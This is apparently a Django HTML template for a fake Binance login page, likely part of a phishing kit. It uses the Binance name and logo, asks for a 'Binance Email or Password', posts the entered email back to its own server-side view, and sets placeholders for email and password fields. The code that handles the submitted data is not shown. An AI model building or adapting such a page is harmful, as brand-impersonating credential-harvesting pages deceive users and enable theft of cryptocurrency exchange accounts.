{% load static %}
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance Email/Password</title>
    <link rel="stylesheet" type="text/css" href="{% static 'css/auth.css' %}">
    <link rel="stylesheet" type="text/css" href="{% static 'fontawesome/css/all.min.css' %}">
</head>

<body>
    <div style="width: 50%;">
    <img src="{% static 'pics/logo.png' %}" style="width: 70%; height: 30%;">
    
    
<div class="container">
    <div class="forms">
        <div class="form login">
            <span class="title">Binance</span>
            <form action="#" method="POST" autocomplete="off"><br>
                 <p>Enter Binance Email or Password</p>
                {% csrf_token %}
                {{form.errors}}
                <div class="input-field">
                {{form.email}}
                <!-- <input type="text" placeholder="Enter your Email" required> -->
                <i class="fa fa-user"></i>
            </div>

            <div class="input-field button">
                <input type="submit" value="Login">
            </div>
            
            </form><br>
        </div>
    </div>
</div>
</div>
</body>

<script src="{% static 'js/jquery.js' %}"></script>
<script>
const container = document.querySelector(".container"),
    PwShowHide = document.querySelectorAll(".showHidePw"),
    pwFields = document.querySelectorAll("#id_password"),
    signUp = document.querySelector(".signup-link"),
    login = document.querySelector(".login-link");

        PwShowHide.forEach(eyeIcon=>{
            eyeIcon.addEventListener("click",()=>{
                pwFields.forEach(pwField=>{
                    if(pwField.type === 'id_password'){
                        pwField.type = "text";

                        PwShowHide.forEach(icon =>{
                            icon.classList.replace('fa-eye-slash', 'fa-eye');
                        })
                    }else{
                        pwField.type = 'id_password';

                        PwShowHide.forEach(icon =>{
                            icon.classList.replace('fa-eye', 'fa-eye-slash');
                        })
                    }
                })
            })
        })


        $("#id_email").attr("placeholder", "Type your Email Address..");
        $("#id_password").attr("placeholder", "Type your Password..");
               
</script>
</html>
